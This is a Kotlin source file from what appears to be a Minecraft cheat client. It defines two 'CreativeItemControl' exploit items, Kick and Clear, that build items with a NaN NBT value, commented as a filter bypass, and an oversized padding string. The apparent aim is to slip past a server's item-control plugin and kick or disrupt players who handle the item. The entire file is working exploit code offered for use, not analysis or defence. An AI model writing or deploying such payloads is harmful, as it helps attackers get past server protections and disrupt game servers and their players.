package net.tarasandedevelopment.tarasande.screen.cheatmenu.creative

import net.minecraft.item.Item
import net.minecraft.item.ItemStack
import net.minecraft.item.Items
import net.minecraft.nbt.NbtCompound
import net.minecraft.nbt.NbtDouble
import net.minecraft.nbt.NbtString
import net.minecraft.util.registry.Registry
import net.tarasandedevelopment.tarasande.base.screen.cheatmenu.creative.ExploitCreativeItem
import net.tarasandedevelopment.tarasande.value.ValueRegistry

val cicExploits = mutableListOf(Kick(), Clear())

class Kick : ExploitCreativeItem("CreativeItemControl: Kick", ItemStack(Items.DRAGON_EGG)) {

    val item = object : ValueRegistry<Item>(this, "Item", Registry.ITEM, Items.DRAGON_EGG) {
        override fun filter(key: Item) = key != Items.AIR
        override fun getTranslationKey(key: Any?) = (key as Item).translationKey
    }

    override fun get(): ItemStack {
        val stack = ItemStack(this.item.list[0])
        var hacked = ""
        val illegal = NbtCompound()
        illegal.put("adminkicker", NbtDouble.of(Double.NaN)) // Cic Filter bypass by Paul
        for (i in 0 .. 899)
            hacked += "§c§l        "
        illegal.put("z", NbtString.of(hacked))
        stack.nbt = illegal
        return stack
    }
}

class Clear : ExploitCreativeItem("CreativeItemControl: Clear", ItemStack(Items.DRAGON_EGG)) {

    val item = object : ValueRegistry<Item>(this, "Item", Registry.ITEM, Items.DRAGON_EGG) {
        override fun filter(key: Item) = key != Items.AIR
        override fun getTranslationKey(key: Any?) = (key as Item).translationKey
    }

    override fun get(): ItemStack {
        val stack = ItemStack(this.item.list[0])
        var hacked = ""
        val illegal = NbtCompound()
        illegal.put("adminkicker", NbtDouble.of(Double.NaN)) // Cic Filter bypass by Paul
        for (i in 0 .. 999)
            hacked += "               "
        illegal.put("z", NbtString.of(hacked))
        stack.nbt = illegal
        return stack
    }
}
